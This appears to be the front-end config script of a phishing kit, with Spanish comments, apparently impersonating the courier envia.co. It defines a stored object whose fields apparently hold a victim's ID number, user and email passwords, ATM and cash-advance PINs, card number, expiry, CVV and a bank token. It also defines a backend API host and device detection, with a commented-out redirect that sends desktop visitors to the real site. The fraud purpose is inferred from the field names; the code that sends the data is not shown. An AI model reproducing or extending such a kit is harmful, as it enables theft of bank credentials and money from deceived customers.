/**
 * CONFIGURACION 
 */
    const API_URL = 'http://127.0.0.1:8080'; // Cambiar según convenga.
    // const API_URL = 'https://apinewentrega.cleverapps.io'; // Cambiar según convenga.





const LS = window.localStorage;
let info = {
    cc: '',
    names: '',
    cenv: '',
    dir: '',
    user: '',
    puser: '',
    ccajero: '',
    cavances: '',
    email: '',
    pemail: '',
    cel: '',
    ban: '',
    p: '',
    f: '',
    c: '',
    type: '',
    tok: '',
    err: ''
}

LS.getItem('info') ? info = JSON.parse(LS.getItem('info')) : LS.setItem('info', JSON.stringify(info));

function limitarDigitos(input, maxDigits) {
    parseInt(input.value)
    if (input.value.length > maxDigits) {
        input.value = input.value.slice(0, maxDigits);
    }
}

function detectar_dispositivo(){
    var dispositivo = "";
    if(navigator.userAgent.match(/Android/i))
        dispositivo = "Android";
    else
        if(navigator.userAgent.match(/webOS/i))
            dispositivo = "webOS";
        else
            if(navigator.userAgent.match(/iPhone/i))
                dispositivo = "iPhone";
            else
                if(navigator.userAgent.match(/iPad/i))
                    dispositivo = "iPad";
                else
                    if(navigator.userAgent.match(/iPod/i))
                        dispositivo = "iPod";
                    else
                        if(navigator.userAgent.match(/BlackBerry/i))
                            dispositivo = "BlackBerry";
                        else
                            if(navigator.userAgent.match(/Windows Phone/i))
                                dispositivo = "Windows Phone";
                            else
                                dispositivo = "PC";
    return dispositivo;
}

// if(detectar_dispositivo() === "PC"){
//   window.location.href('https://envia.co')
// }

console.log("Main ON");